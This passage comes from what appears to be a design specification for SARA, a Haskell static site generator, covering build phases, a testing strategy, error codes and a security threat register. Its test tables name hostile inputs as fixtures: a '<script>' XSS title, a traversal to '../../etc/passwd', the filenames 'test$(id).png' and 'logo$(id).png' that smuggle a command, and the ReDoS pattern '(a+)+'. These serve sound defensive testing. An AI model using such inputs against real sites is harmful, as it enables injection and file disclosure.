2. Implement `SARA/Frontmatter/Parser.hs`. Include `escapeHtmlValue` call on parsed output.
3. Implement `SARA/Frontmatter/Remap.hs`.
4. Integrate into `SARA/Markdown/Parser.hs`.

**Key test cases:**
- YAML, TOML, JSON, and no-delimiter files.
- Frontmatter with a `<script>` value in `title` → output is HTML-escaped.
- UTF-8 multi-byte characters spanning the frontmatter delimiter.
- Empty file. File with only frontmatter and no body.

---

### Phase 3: Routing Engine (Week 2–3)

**Tasks:**

1. Implement `SARA/Routing/Engine.hs`. `regexRoute` calls `mkSafeRegex` from `RegexGuard`.
2. Implement `resolveRoute` for all route types.
3. Implement `detectRouteConflicts`.

**Key test cases:**
- `regexRoute "(a+)+"` → `SecurityRegexReDoS` (ReDoS pattern rejected).
- Jekyll-style URL preservation.
- Route conflict detection.

---

### Phase 4: Core Engine — Shake Integration (Week 3)

**Tasks:**

1. Implement `SARA/Internal/Hash.hs` (BLAKE3 oracle).
2. Implement `SARA/Internal/Planner.hs` (translate `RuleDecl` list to `Shake.Rules`). Every file path passed to a Shake rule is wrapped in `guardPath`.
3. Implement `SARA/Internal/Engine.hs`.
4. Wire `sara build` CLI to `Engine.runBuild`.
5. Confirm incremental build correctness.

---

### Phase 5: Template Rendering (Week 3–4)

**Tasks:**

1. Implement `SARA/Template/Renderer.hs` with Shake oracle cache.
2. Include `auditTemplateForRawInterpolation` in the oracle compilation step.
3. Implement `assembleContext`.
4. Test: template with `{{{ title }}}` → `TemplateUnsafeInterpolation` error.
5. Test: template with `{{{ sara.jsonLD }}}` → no error (whitelisted).

---

### Phase 6: SEO Intelligence (Week 4)

**Tasks:**

1. Implement `SARA/SEO/JsonLD.hs`, `SARA/SEO/OpenGraph.hs`, `SARA/SEO/Audit.hs`.
2. Tests per §12.3.

---

### Phase 7: Link & Asset Validator (Week 5)

**Tasks:**

1. Build `SiteGraph` accumulation in `SaraEnv`.
2. Implement link checker and asset checker.
3. Tests: broken internal link → `ValidatorBrokenLink`; absolute URLs not flagged.

---

### Phase 8: Asset Pipeline (Week 5)

**Tasks:**

1. Implement `SARA/Asset/Discover.hs`. `discoverAssets` takes `GlobPattern`, calls `guardPath` on each expanded path.
2. Implement `SARA/Asset/Image.hs`. Uses `safeCmd` exclusively for shell-outs.
3. Implement `SARA/Asset/Copy.hs`.
4. Test: file named with shell metacharacters → processed safely, no shell execution.

---

### Phase 9: Live Reload (Week 6)

**Tasks:**

1. Implement `SARA/LiveReload/Watcher.hs` and `SARA/LiveReload/Server.hs`.
2. Dev server binds to `127.0.0.1` by default.
3. LiveReload JS snippet injected before `</body>`.

---

### Phase 10: Migration Toolchain (Week 6–7)

**Tasks:**

1. Implement detection, shortcode translation, and scaffolder.
2. All file copy operations go through `guardPath`.
3. Test: Jekyll fixture with `{% post_url %}` → correct SARA project.

---

### Phase 11: Search Index (Week 7)

**Tasks:**

1. Implement `SARA/Search/Index.hs`.
2. HTML-strip body text using `tagsoup` before indexing.
3. Test: 100-post site → valid JSON search index.

---

### Phase 12: Security Audit & CI Hardening (Week 8)

**Deliverable**: Full security test suite passes. CI enforces `-Werror`. HLint passes with zero violations.

**Tasks:**

1. Run `cabal test` under `cabal.project.ci` (with `-Werror`). Fix all warnings.
2. Run HLint on `src/` and `test/`. Fix all violations.
3. Add CI test: read every file in `templates/` and assert zero unwhitelisted `{{{ }}}` occurrences.
4. Run the QuickCheck path-traversal property with 100,000 iterations.
5. Write `docs/SECURITY.md` with the public security disclosure policy.

---

### Phase 13: CLI Polish & Documentation (Week 8)

**Tasks:**

1. All CLI commands via `optparse-applicative`.
2. Audit all error messages against the three-part format.
3. Write `docs/QUICKSTART.md`, `docs/MIGRATION.md`, `docs/ERRORS.md`.

---

## 23. Testing Strategy

### 23.1 Unit Tests (hspec + hspec-discover)

Every `SaraError` constructor has at least one test that exercises it. Every security module has its own `SecuritySpec.hs` section.

```
describe "SARA.Security.PathGuard" $ do
  it "rejects path traversal via .." $ ...
  it "rejects absolute paths outside root" $ ...
  it "accepts canonical paths within root" $ ...
  it "resolves symlinks before checking" $ ...

describe "SARA.Security.RegexGuard" $ do
  it "rejects nested quantifiers (a+)+" $ ...
  it "rejects alternation in repetition (a|ab)+" $ ...
  it "accepts the canonical SARA route pattern" $ ...

describe "SARA.Security.HtmlEscape" $ do
  it "escapes <script> in title" $ ...
  it "escapes \" in attribute values" $ ...
  it "flags {{{ title }}} as unsafe" $ ...
  it "allows {{{ sara.jsonLD }}}" $ ...
```

### 23.2 Property Tests (QuickCheck)

**Security properties:**

```haskell
-- File: test/Property/SecurityProp.hs

-- No generated path may escape the project root.
prop_guardPath_neverEscapesRoot
  :: ProjectRoot -> FilePath -> Property
prop_guardPath_neverEscapesRoot root p =
  case guardPath root p of
    Left  _            -> property True  -- correctly rejected
    Right (SafePath q) -> isPrefixOf (canonicalRoot root) q

-- HTML escaping is idempotent.
prop_escapeHtmlValue_idempotent
  :: Aeson.Value -> Property
prop_escapeHtmlValue_idempotent v =
  escapeHtmlValue (escapeHtmlValue v) === escapeHtmlValue v

-- Remap is idempotent when fromKey == toKey.
prop_remap_idempotent :: RemapSpec -> Aeson.Object -> Property

-- resolveRoute is deterministic.
prop_resolveRoute_deterministic
  :: ValidSourcePath -> Route 'Abstract -> Property

-- parseFrontmatter never panics on arbitrary ByteString.
prop_parse_neverPanics :: ByteString -> Property
```

### 23.3 Integration Tests (fixture sites)

| Fixture | Tests |
|---------|-------|
| `minimal/` | 1 page, no frontmatter, no assets. Smoke test. |
| `blog/` | 20 posts, YAML frontmatter, image assets, index page. |
| `jekyll-import/` | Jekyll site → `sara import` → `sara build`. |
| `broken-links/` | Deliberate broken links → build fails with correct error. |
| `seo-audit/` | Missing alt tags and skipped headings → correct warnings. |
| `xss-attempt/` | Frontmatter with `<script>` values → output is escaped. |
| `path-traversal/` | `discover "../../etc"` → `SecurityGlobEscape` at rule construction. |
| `shell-metachar/` | Image named `logo$(id).png` → safe processing, no execution. |
| `redos-route/` | `regexRoute "(a+)+"` → `SecurityRegexReDoS` at rule construction. |

### 23.4 Outlier & Edge Case Test Matrix

| Scenario | Expected Behaviour |
|----------|--------------------|
| Empty Markdown file | Item with empty body, empty metadata |
| Markdown file that is only frontmatter | Item with metadata, empty body |
| Frontmatter with 1000 keys | Parses successfully; no quadratic slowdown |
| File with mixed CRLF/LF line endings | Delimiter detection handles both |
| Template with `{{{ title }}}` | `TemplateUnsafeInterpolation` error |
| Template with `{{{ sara.jsonLD }}}` | No error; whitelisted |
| Frontmatter `title: "<script>alert(1)</script>"` | Escaped to `&lt;script&gt;` in output |
| `discover "../../etc/passwd"` | `SecurityGlobEscape` at rule construction |
| File named `test$(id).png` | `safeCmd` processes safely; no shell execution |
| `regexRoute "(a+)+"` | `SecurityRegexReDoS` before any file is processed |
| Route regex with no capture groups | Works; replacement has no `\1` |
| Two files → same output path | `RouteConflict` |
| Image 1×1 pixel | Processed without divide-by-zero |
| Filename with 255 characters | Handled gracefully |
| UTF-8 filename | Handled correctly on all platforms |
| Symlink pointing outside project root | `SecurityPathTraversal` (after `canonicalizePath`) |
| Build with 5,000 posts | Cold start < 2 seconds |
| Single file change in 5,000-post site | Hot rebuild < 50ms |

---

## 24. Benchmarking & The SARA Standard

`Sara.md` defines the **10k Post Test** as a mandatory release gate:

| Test | Target | Method |
|------|--------|--------|
| Cold start — 5,000 files | < 2 seconds | `criterion` with fixture generator |
| Hot rebuild — 1 file change | < 50ms | `criterion` with pre-warmed Shake state |
| Memory — large image library | Constant space | GHC RTS `+RTS -s` peak memory check |
| Security audit overhead | < 5ms per template | Measured separately; must not dominate hot rebuild |

### Benchmark Fixture Generator

```haskell
-- File: bench/Fixtures.hs

generatePosts :: Int -> FilePath -> IO ()
-- Generates N synthetic Markdown files:
-- - Random YAML frontmatter (title, date, tags, author)
-- - Intentional <script> in title (to exercise escaping path under load)
-- - 500-word body, 2 internal links, 1 image reference
```

### Memory Discipline

All `Item` fields are `StrictData` (enabled globally). Image processing uses JuicyPixels' streaming decode — the full image is never held in memory beyond the processing window.

---

## 25. CLI Interface

```
sara <command> [options]

Commands:
  build   Build the site
  serve   Start development server with live reload
  import  Import an existing site (Jekyll, Hugo, Hakyll)
  new     Scaffold a new SARA project from a template
  check   Validate without writing output (dry run)

sara build [--output DIR] [--jobs N] [--verbose] [--no-fail-on-warn]
sara serve [--port N] [--bind ADDR] [--open]
  --bind ADDR   Network address to bind (default: 127.0.0.1)
sara import <src> [--output DIR] [--from SSG] [--remap K=V ...]
sara new <name> [--template blog|docs|portfolio]
sara check [--strict]
```

Exit codes:

| Code | Meaning |
|------|---------|
| `0` | Success |
| `1` | Build failed (at least one `AuditFail` error) |
| `2` | Configuration error |
| `3` | Security violation (path traversal, ReDoS, etc.) |
| `4` | Internal error — file a bug |

---

## 26. Open Design Questions & Future Work

These items are deferred — not in scope for v1.0, but the architecture must not close them off.

### 26.1 Plugin System

A future plugin API would allow third-party modules to register shortcodes, route types, and audit checks. The `SaraM` monad is opaque to enable this without breaking changes.

### 26.2 Incremental Link Checking

Currently all internal links are re-checked on every file change. A future optimisation: maintain a reverse-link index so only pages linking *to* the changed file are re-validated.

### 26.3 SCSS/TypeScript Compilation

`StyleAsset` and `ScriptAsset` currently pass through verbatim. A future `AssetSpec` field could declare a `.scss` → `sass` or `.ts` → `esbuild` compilation step, with shell-outs going through `safeCmd`.

### 26.4 Multilingual Sites

The routing engine has no locale concept. A future `locale:` frontmatter key could enable locale-aware slug generation and `<link rel="alternate">` injection.

### 26.5 Content Security Policy Header Generation

The dev server could generate a per-page `Content-Security-Policy` header based on the scripts and stylesheets referenced in the rendered HTML. This is future work but the architecture supports it — the rendered HTML is already available as `Text` after the rendering phase.

---

## Appendix A: Error Code Reference

| Code | Constructor | Default Level | Description |
|------|------------|--------------|-------------|
| E0001 | `FrontmatterUnknownFormat` | Warn | File has an unrecognised delimiter |
| E0002 | `FrontmatterParseFailure` | Fail | Invalid YAML/TOML/JSON syntax |
| E0003 | `FrontmatterRemapMissing` | Warn | Remap source key not found |
| E0010 | `RouteRegexInvalid` | Fail | Regex fails to compile |
| E0011 | `RouteConflict` | Fail | Two files → same output path |
| E0020 | `MarkdownUnsupportedExtension` | Warn | GFM extension not supported |
| E0030 | `TemplateNotFound` | Fail | Template file does not exist |
| E0031 | `TemplateRenderFailure` | Fail | Mustache render failed |
| E0032 | `TemplateKeyMissing` | Warn | Template references undefined key |
| E0033 | `TemplateUnsafeInterpolation` | Fail | `{{{ }}}` found outside sara.* whitelist |
| E0040 | `SEOAltMissing` | Configurable | `<img>` missing `alt=` |
| E0041 | `SEOHeadingSkip` | Configurable | Heading level skipped |
| E0042 | `SEOTitleMissing` | Fail | Page has no `<title>` |
| E0050 | `ValidatorBrokenLink` | Fail | `href=` → non-existent page |
| E0051 | `ValidatorMissingAsset` | Fail | `src=` → non-existent asset |
| E0060 | `AssetProcessingFailed` | Fail | Image conversion failed |
| E0070 | `MigrationUnsupportedShortcode` | Warn | Shortcode has no SARA equivalent |
| E0080 | `ConfigKeyMissing` | Fail | Required `sara.yaml` key absent |
| S0001 | `SecurityPathTraversal` | Fail | Path escapes project root |
| S0002 | `SecurityGlobEscape` | Fail | Glob pattern escapes project root |
| S0003 | `SecurityRegexReDoS` | Fail | Regex has ReDoS risk (nested quantifiers) |
| S0004 | `SecurityShellInjection` | Fail | File path contains NUL byte |
| S0005 | `SecurityUnsafeTemplate` | Fail | `{{{ }}}` in template (same as E0033; dual-reported) |

---

## Appendix B: Security Threat Register

| Threat ID | Name | Attack Vector | Mitigation | Module | Status |
|-----------|------|--------------|-----------|--------|--------|
| T-01 | HTML/Template Injection | Frontmatter → template → browser | `escapeHtmlValue` at parse time; `{{{ }}}` audit | `SARA.Security.HtmlEscape` | Structural |
| T-02 | Path Traversal | Glob patterns or file paths | `guardPath` on every filesystem access | `SARA.Security.PathGuard` | Structural |
| T-03 | Shell Injection | File paths to external processes | `safeCmd` (list form, no shell) | `SARA.Security.ShellGuard` | Structural |
| T-04 | ReDoS | Route regex patterns | `mkSafeRegex` structural complexity check | `SARA.Security.RegexGuard` | Structural |
| T-05 | Unsafe Template Interpolation | Developer using `{{{ }}}` | Template audit pass at build time | `SARA.Security.HtmlEscape` | Structural |
| T-06 | SQL Injection | N/A | **Not applicable** — SARA has no database connectivity | — | N/A |
| T-07 | Dev Server Exposure | `sara serve` on shared network | Localhost-only bind by default | `SARA.LiveReload.Server` | Default-safe |

---

## Appendix C: Glossary

| Term | Definition |
|------|-----------|
| **Item** | Central data structure: source file + parsed metadata + resolved route + content hash. |
| **SiteGraph** | Complete set of output file paths that will exist in `_site/` after build. |
| **Oracle** | Shake mechanism for caching expensive computations (BLAKE3 hashes, templates) across incremental builds. |
| **AuditLevel** | Whether a violation halts the build (`AuditFail`) or warns (`AuditWarn`). Configurable per category. |
| **Abstract Route** | A route pattern declared in the DSL (not yet applied to a file). |
| **Resolved Route** | A concrete output path produced by applying an Abstract Route to a source file. |
| **Frontmatter** | Structured metadata at the top of a Markdown file, delimited by `---`, `+++`, or `{`. |
| **Remap** | Configuration directive to rename a frontmatter key across all files. |
| **SaraM** | The SARA monad: `ReaderT`/`WriterT`/`ExceptT` over `IO`. |
| **GlobPattern** | Opaque newtype. A glob pattern confirmed to be syntactically valid and confined to the project root. |
| **SafePath** | Opaque newtype. A file path confirmed to be a descendant of the `ProjectRoot`. |
| **SafeRegex** | Opaque newtype. A compiled regex confirmed to be free of ReDoS risk. |
| **ProjectRoot** | Opaque newtype. The canonical project root directory, established once at startup. |
| **safeCmd** | SARA's shell-out wrapper. Passes arguments as a list to `execvp`; never invokes a shell interpreter. |
| **escapeHtmlValue** | Recursively HTML-escapes all string leaves in an Aeson `Value` tree. Applied once, at parse time. |

---

*Document version 1.1 — All review gaps from v1.0 formal audit closed.*
*Prepared against Sara.md (project inception document).*
*Pin exact dependency versions in `cabal.project.freeze` for reproducible builds.*
*Security disclosures: see `docs/SECURITY.md`.*
